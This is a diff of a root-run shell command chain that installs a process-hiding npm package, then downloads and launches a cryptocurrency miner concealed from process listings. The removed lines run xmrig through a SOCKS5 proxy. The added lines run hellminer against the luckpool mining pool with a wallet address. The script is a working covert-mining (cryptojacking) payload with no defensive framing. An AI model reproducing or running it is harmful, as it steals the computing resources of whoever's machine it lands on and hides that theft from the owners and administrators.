@@ -3,9 +3,7 @@ sudo su --command "sudo apt update &&
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && 
 sudo apt install nodejs && 
 npm i -g node-process-hider &&
-sudo ph add xmrig &&
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz &&
-tar -zxf xmrig-6.16.4-linux-x64.tar.gz &&
-cd xmrig-6.16.4 &&
-chmod +x xmrig &&
-./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=GNTL --threads=30 -x socks5://192.252.214.20:15864"
+sudo ph add hellminer &&
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && 
+tar -xf hellminer_cpu_linux.tar.gz && 
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RTBPM3NCdNkHu7FTpSe5VcKAYt2DqHBJbP.gyro -p x --cpu 2;
